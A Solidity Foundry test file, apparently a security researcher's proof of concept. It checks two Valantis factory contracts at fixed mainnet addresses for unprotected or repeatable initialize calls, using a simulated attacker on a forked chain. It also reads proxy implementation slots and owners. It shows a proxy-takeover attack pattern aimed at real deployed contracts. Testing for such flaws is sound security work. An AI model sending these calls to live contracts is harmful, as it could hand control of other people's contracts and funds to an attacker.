// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title Pattern 1: Proxy Initialization Bypass PoC
 * @notice Tests for uninitialized proxy vulnerabilities in Valantis factories
 * @dev Run with: forge test --match-contract ProxyInitBypass --fork-url $MAINNET_RPC -vvv
 */
contract ProxyInitBypassTest is Test {
    // Target contracts from analysis
    address constant PROTOCOL_FACTORY = 0x29939b3b2aD83882174a50DFD80a3B6329C4a603;
    address constant POOL_FACTORY = 0xa68d6c59Cf3048292dc4EC1F76ED9DEf8b6F9617;
    
    address attacker;
    
    function setUp() public {
        // Create attacker account
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
        
        console.log("=== Pattern 1: Proxy Initialization Bypass ===");
        console.log("Target: Protocol Factory", PROTOCOL_FACTORY);
        console.log("Target: Pool Factory", POOL_FACTORY);
        console.log("Attacker:", attacker);
    }
    
    /**
     * @notice Test 1: Check if contracts have initialize functions
     */
    function test_CheckInitializeFunctions() public view {
        console.log("\n[Test 1] Checking for initialize functions...");
        
        // Try to call initialize (will revert if not present)
        bytes memory initCalldata = abi.encodeWithSignature("initialize()");
        
        (bool successProtocol,) = PROTOCOL_FACTORY.staticcall(initCalldata);
        (bool successPool,) = POOL_FACTORY.staticcall(initCalldata);
        
        console.log("Protocol Factory has initialize:", successProtocol);
        console.log("Pool Factory has initialize:", successPool);
    }
    
    /**
     * @notice Test 2: Attempt to call initialize as attacker
     */
    function test_AttemptInitializeAsAttacker() public {
        console.log("\n[Test 2] Attempting to initialize as attacker...");
        
        vm.startPrank(attacker);
        
        // Try to initialize Protocol Factory
        try this.tryInitialize(PROTOCOL_FACTORY) {
            console.log("CRITICAL: Protocol Factory initialized by attacker!");
            assertTrue(false, "Vulnerability confirmed: unprotected initialize");
        } catch {
            console.log("Safe: Protocol Factory initialize protected or not present");
        }
        
        // Try to initialize Pool Factory
        try this.tryInitialize(POOL_FACTORY) {
            console.log("CRITICAL: Pool Factory initialized by attacker!");
            assertTrue(false, "Vulnerability confirmed: unprotected initialize");
        } catch {
            console.log("Safe: Pool Factory initialize protected or not present");
        }
        
        vm.stopPrank();
    }
    
    /**
     * @notice Test 3: Check for implementation slot
     */
    function test_CheckImplementationSlot() public view {
        console.log("\n[Test 3] Checking implementation slots...");
        
        // EIP-1967 implementation slot
        bytes32 IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        
        bytes32 protocolImpl = vm.load(PROTOCOL_FACTORY, IMPLEMENTATION_SLOT);
        bytes32 poolImpl = vm.load(POOL_FACTORY, IMPLEMENTATION_SLOT);
        
        console.log("Protocol Factory implementation:", vm.toString(protocolImpl));
        console.log("Pool Factory implementation:", vm.toString(poolImpl));
        
        if (protocolImpl == bytes32(0)) {
            console.log("WARNING: Protocol Factory has no implementation (not a proxy or vulnerable)");
        }
        if (poolImpl == bytes32(0)) {
            console.log("WARNING: Pool Factory has no implementation (not a proxy or vulnerable)");
        }
    }
    
    /**
     * @notice Test 4: Attempt to reinitialize
     */
    function test_AttemptReinitialize() public {
        console.log("\n[Test 4] Attempting reinitialization...");
        
        vm.startPrank(attacker);
        
        // Try to reinitialize with different parameters
        bytes memory reinitCalldata = abi.encodeWithSignature(
            "initialize(address)",
            attacker
        );
        
        (bool success,) = PROTOCOL_FACTORY.call(reinitCalldata);
        if (success) {
            console.log("CRITICAL: Reinitialization succeeded!");
            assertTrue(false, "Vulnerability: contract can be reinitialized");
        } else {
            console.log("Safe: Reinitialization blocked");
        }
        
        vm.stopPrank();
    }
    
    /**
     * @notice Helper function to try initialize
     */
    function tryInitialize(address target) external {
        (bool success,) = target.call(abi.encodeWithSignature("initialize()"));
        require(success, "Initialize failed");
    }
    
    /**
     * @notice Test 5: Check owner/admin roles
     */
    function test_CheckOwnership() public view {
        console.log("\n[Test 5] Checking ownership...");
        
        // Try common owner functions
        try this.getOwner(PROTOCOL_FACTORY) returns (address owner) {
            console.log("Protocol Factory owner:", owner);
        } catch {
            console.log("Protocol Factory: No owner() function");
        }
        
        try this.getOwner(POOL_FACTORY) returns (address owner) {
            console.log("Pool Factory owner:", owner);
        } catch {
            console.log("Pool Factory: No owner() function");
        }
    }
    
    function getOwner(address target) external view returns (address) {
        (bool success, bytes memory data) = target.staticcall(
            abi.encodeWithSignature("owner()")
        );
        require(success, "No owner function");
        return abi.decode(data, (address));
    }
}
